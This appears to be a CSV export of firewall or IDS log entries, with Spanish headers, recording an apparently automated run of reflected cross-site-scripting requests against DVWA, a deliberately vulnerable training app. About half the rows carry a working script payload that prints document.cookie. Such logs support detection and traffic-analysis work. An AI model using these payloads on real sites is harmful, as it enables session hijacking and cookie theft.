ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('SIGQ9QJKOFPKZICQQ1LYE90YQN0H1S718A1LTXEL5LUOJ4E837');console.log(document.cookie);</script>&user_token=f581025435b8817208885b21eab06342
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RIIG4H7HUW5S5Y3RGATGKASYMT6BY6BO41U8ILIEV7GJ4W65J8');console.log(document.cookie);</script>&user_token=c8677616753b2dd59b3e27d41dc60e71
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('RDKT4Q69P0R7EIQGB24I6HWRRKKNQAWNWNFZ647WBEN5008BML');console.log(document.cookie);</script>&user_token=0833e1021605c044eeaca356f569706f
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,777129,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('K3H0WQS19SNS2LPDNQCXRSZ8UJ9KHEWN448W44EGK6WOSVKIOI');console.log(document.cookie);</script>&user_token=f526b2bdc6cc8dc70e0224e7efffee05
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WZ9566VTHU96DXJYK846XJHZF6T8GIPQYDPN77RFDW3HX5WMAV');console.log(document.cookie);</script>&user_token=c7dd29b8186ae678c29db61884919236
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VUN830RHWN42GFB3VI933U414QL1R36HN6UJ80JU4XH7KC7KJQ');console.log(document.cookie);</script>&user_token=d45ca432de029aefcc7bc51dbdf0ad46
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UY6F4550BOKUMBDWMLE4U28CBMQWWFPO63W499R7ARBI58T3ZJ');console.log(document.cookie);</script>&user_token=d6ae1ec31263b26463cbcd5c09a00910
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('KJYU2MQHKGC5ZN5WO4YZ7T0I9Q86VJBMLGPW0CDMM9ZKNEFIT1');console.log(document.cookie);</script>&user_token=9ee302fc3284dce16460e4cc39f6a262
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('OKKMZHBRM8IWQEUEJ3GQ7Z7TE1DJYPO36MFJNT1MCGBN64EY4O');console.log(document.cookie);</script>&user_token=079fdc51acee8572a300798f2cc03569
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('TEETSFMAFX6WEEE1BFZQXAJ4FB1X5Y9N6QLSR1BZMEMDYHJ71X');console.log(document.cookie);</script>&user_token=58f704755dd33ffef402c3f4ff00e902
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('MCRMJWZ6VN7SI1N4GK77OFDA9WOWYJQSSGCRSOHLP7PRTDLH5G');console.log(document.cookie);</script>&user_token=fa0d874bf16a51ef351fa09f08141137
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('DEV5C1IIO35LO2NIIJODO7YFT5LK6EDMNZVDGRWRO0UITI0SBM');console.log(document.cookie);</script>&user_token=f6bc5e72a017dedec7e5f701468fa2df
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('QO4U3BRI1BTYQC913ATYIVNHJSKJF186FK4UCKA1CV7CE3FVOQ');console.log(document.cookie);</script>&user_token=0f86176a65c07315f5f8e7e4ba98b93b
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('46OBTHHFGK22SGAP2238DCJZ40DXSR0XA9F184VHLGMUIYFUYD');console.log(document.cookie);</script>&user_token=8878b304427afe3430910fc2b6ea7155
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4RPVX08KDLKI7IH4ISVCSSFCNLGZ49BHRFVO0VWOWDWY0Q5U34');console.log(document.cookie);</script>&user_token=26f564ef14c2cda2c43c4a358e478d69
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WRU6682C2036SDUVSXBX65H4DX7JNGP0IHDMF7Q3T5GFGZ4QWV');console.log(document.cookie);</script>&user_token=aed2c96c52be72e95708e08bc9a42958
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VCEIA8FQOT4QBSRPCE9ROMOGP6AQ8QQI9P67MSBWXAG7FCK7R4');console.log(document.cookie);</script>&user_token=dc3d984ec2ec6ee041d717c6eb0bc79b
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('HHU2SYBTRCJ9QHWGS49EXRMC3TEUQY55VTZZJXJJAV88MFRTV3');console.log(document.cookie);</script>&user_token=6111a3284ff04aebeb0ac438050e31f0
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IU7PMBQDHIAZK1U2Z7PRBBBF2ZR8Z7P8G492CZ06FAV6GQWARY');console.log(document.cookie);</script>&user_token=ba99dbc2ea3374b82628f4508446efe5
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('DGB3LZXV711GBSI9ASKB13WT24GRRKRDAD7JX1THZK0VAU52VD');console.log(document.cookie);</script>&user_token=b09f04046c9239313a8ef88e10bee481
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('LXOO7ZTVDT4J1FHZ3W12IOQTVVYSOZH9LMX4MPT83043WWBLQW');console.log(document.cookie);</script>&user_token=435d9858eefd11ec69e7b6899018c9b5
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('1M828019W3UZI9DVR1RN995E08M5LND0WE32LY4A83KBV9FXAO');console.log(document.cookie);</script>&user_token=eeda0fb6c315a974080a4683a2a7fee1
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('MK7BQK457O4SM4SWD46Z4NFLC2OUM147W33RLEPKRHCQAVFBRB');console.log(document.cookie);</script>&user_token=f73ebd74f9e73725bb095133da47e5f3
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UA1LT0J117NKEZCPL39U2L6PBSKSRIBOC38JDPVKE0NQ8Q9YRN');console.log(document.cookie);</script>&user_token=4e5eef15f1ed9642f929f5e746321da5
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('EYVK2I49SXF8XOLY11WO292VRNE1VNNUZLX6J4Y59JZ9VSDF9P');console.log(document.cookie);</script>&user_token=abae97713826a9ff9027a681cca2b842
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('A9HC2PZNWU053FJIIAR4R8CKL5BT6IQ67BZ1J5V1IINQRLH8I9');console.log(document.cookie);</script>&user_token=dc3825214e54cbf591b0454f04601526
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('JCQINTQRB6DUYKH1HLMBLSI75YQR3AIBUCVHJSA1GLRRYNBJVO');console.log(document.cookie);</script>&user_token=37ae11cb325238d8689d9dacaef3263a
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('04XNKBJHDITB911Q9A7ZQGKUHI2NFOUGRBWMOUMBKLY6U8EAXF');console.log(document.cookie);</script>&user_token=f2266bbcfe43ba1e7cdb3aa88d5e3dce
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('H7GG17DKP19R5PZF279CTOYBOND3FRI2HMZUO3TXUKB4IHB96P');console.log(document.cookie);</script>&user_token=4c228c2b1f119bb7e6616d256005ae06
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('3ET6POTKMCA7FJXKDWRIEJYIX3OWVT9WEVE6BKENNITU9C8NI6');console.log(document.cookie);</script>&user_token=8afb4e7497a4adf73716da02bdbe41c5
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('T3N8QMTPXQ23DY6GUXFYH6R617W8VW8N2DN8QF6XLJEFB5T3ZJ');console.log(document.cookie);</script>&user_token=dd3d0621cf1d39ecb10665ebd680174b
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('YA6TCABOGC5AIZROH4880TAN1HWPG5NYQRU97KN4Q88032VJWH');console.log(document.cookie);</script>&user_token=490accd86c8cc5f76d687c4f09cba9f1
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ZXU075NMFW7EXY7DD9W33SHM2Q80BVFA4TAL9IAV6O8N92FZ4C');console.log(document.cookie);</script>&user_token=296a92bc2c410d2d2669e555c6b2d578
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('M96AA9351JKE9C50JGSTAUVSKKZ9SOYZKSR37Y83UX273V0L9Y');console.log(document.cookie);</script>&user_token=9e317e46bda9ac56d6bfebb08ef16af4
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('DOZQ4DY38XHWCRCJWWLTBUXXDFNF8GLF7TH394RIW80K29X0H5');console.log(document.cookie);</script>&user_token=f24b71f5d1b1e7eb029aa3660963f0f7
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('6GBJDIMIMXARUG683IOQBNVUR64O0MBNB2CU4ZRMEBUUUOAIPM');console.log(document.cookie);</script>&user_token=49e752fa4ff199d77b80f08fb9238fd3
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('1DZRVX09HZHXWNQGGJQSMSB14UKZI7IGTWOZM517LB3E6AHZCV');console.log(document.cookie);</script>&user_token=c192c5f09ca846b0f91b781510a9c186
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('WWTWIKZDGTA45H5OA0TVI39TVZ5YJBXM8WOGG0LHIY2K7P985J');console.log(document.cookie);</script>&user_token=4020e1f9fa6cc894064a563d37716dd4
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('ZQCJ5ZUCQE1RY58QPYYEZK4BSYEFSQ4MLTQPA7MB3JEGON18D2');console.log(document.cookie);</script>&user_token=d7788bb57562fae947111f37c333e406
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('U37WH1KRYON6SH9GNQAWX9IDA3QEQ071UF9QC8XUR9JKIYAOCD');console.log(document.cookie);</script>&user_token=c3a2bae73f57fbf980286401ccd729ea
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('IPFJ1TYNUNUAO468VXVXLWC47GG016TJA4V9H539XMT7Y118NH');console.log(document.cookie);</script>&user_token=3f499add26754db0be12606277281607
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CGH00WARCC3GS1GUWO13JZBLPA4ZGP0TU1Y4TC9SQX509X84SQ');console.log(document.cookie);</script>&user_token=ffbd574bc895781ac8208acc9bf720d1
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('374B24ESQAREU2DNWJZJ3GWNIWEZMY5VLO2PPK8LQSUSEKKVS3');console.log(document.cookie);</script>&user_token=ceec3d69efca567000d341746c7d8009
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('UY2XHZWP7PQXQA85AHOU36HW78LPH8ZASUK6442GSMOIVO39SO');console.log(document.cookie);</script>&user_token=0a4c0bf849eceee9ca6558ff2243a564
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('9R34G8XIHJJZ6PW0YTKUTLBB99A1RBCOOOCINLJ5IDQIFONXEE');console.log(document.cookie);</script>&user_token=f5f625f037ea87a0cb38bca3e9e53a94
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8WYH3427OO16JH9C6Q2NEVHND10S2BFEA2Y6ZNQCLKFKKD6PNQ');console.log(document.cookie);</script>&user_token=2275af9dcdb33a24c225e1fbd20f986b
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('4MPLJWRO4PLVZAZW83OD29W36LYWJ3WBQ3AK36XC8GNG02613B');console.log(document.cookie);</script>&user_token=b5eb0f9e81c22261a0aac73d0afe550f
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8YZ5NAGPMDOREYZDF3AUHWHYQCUN4T6QY2C3MN1QUZKTWSPYI2');console.log(document.cookie);</script>&user_token=fc2bf300a38ee44176464df0bf062e27
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('41MPJCK0O312ZHPC3308EY0WZ3T28S5ZPFYB13PG4CHVK26NLV');console.log(document.cookie);</script>&user_token=d6b663cc43c4ad8f3eaa65aacf98abda
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('JL9WBXC2A1EMMUSV68PMPEELD1O8M7JUV1C2U49IKVZODTT9N6');console.log(document.cookie);</script>&user_token=2544e07b31a8655655a1f26f1d742908
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8EOBLEG4VFSWQN9CZYC9XVC9NW3K5Q0LG70WDBN4S9C0360SOP');console.log(document.cookie);</script>&user_token=0a2edfa67fbccca30d10bd144dc86194
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('AUNMTE0CPAPRULA4X670HQO8KSBCSNVMHLXXIR2626H3EBUFPP');console.log(document.cookie);</script>&user_token=b1a316aa9cdade82f098c4c7bbd54f06
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('8L6CRV08WICYZ2DP2Q2OCDADJV7UF3JI5Q8M4HNYOJX94ROFHV');console.log(document.cookie);</script>&user_token=262af9def59db9e1c807b5d759ec9ee5
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('2XU8OEZYC9VYTR58X50RUQ7495XS7ERY8R8HZLGYG9SS987U1J');console.log(document.cookie);</script>&user_token=09f3cd77f585965ba8cf4c63e90e2fa7
9999,776779,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('VWR2V73G4DLMGC9RP6932WQE5VF8VWX6BIK1W7KS4ZAHUSJ9TK');console.log(document.cookie);</script>&user_token=7bdadebfcd4d20649ebe68489becb96c
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('YDJ68B36CFZA0XEISMAUIIKMHJQWM4XR7IVXB1QTQCMW6Z46KX');console.log(document.cookie);</script>&user_token=4b231f95db66f0beb4b2954b46bae44a
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('P28W9XMA5M38N90YG971N4E26RDI6GS50I1ZE3KL3RR6QXV3GP');console.log(document.cookie);</script>&user_token=131babb8ca9374ae05e0ec62d9c3331f
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('CFBW0VL3J6TXQYLG5MCYLKIRQQIWIRTVDN97PLZKXN7B58FZPN');console.log(document.cookie);</script>&user_token=8aa788e1496820fe8cc635f53d393453
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('0I6JJMASAFIALTHP957C2GPBQGOUX47KUZMAO5RMX3NSFG85VP');console.log(document.cookie);</script>&user_token=c8bed1c245a0f1aa2e6e5ad0f4abb038
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('BZ6PM26VXGE0KGDL7LSBLJ4BN09A6PT8WF42ICU6A5IN5ENXEJ');console.log(document.cookie);</script>&user_token=dc4fc269cc10adff0fc0e4cdd4fb9391
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/?name=<script>console.log('51PTZFD4LS7G7NTJI3FU4PRQHU8B2UW2MM1709FLNJ29GJWQLK');console.log(document.cookie);</script>&user_token=1818efc39684b837fc0c39037af6989b
9999,774949,1,1,,N/A,tcp,18.218.115.60,172.31.69.28,url,18.218.83.150/DVWA/vulnerabilities/xss_r/
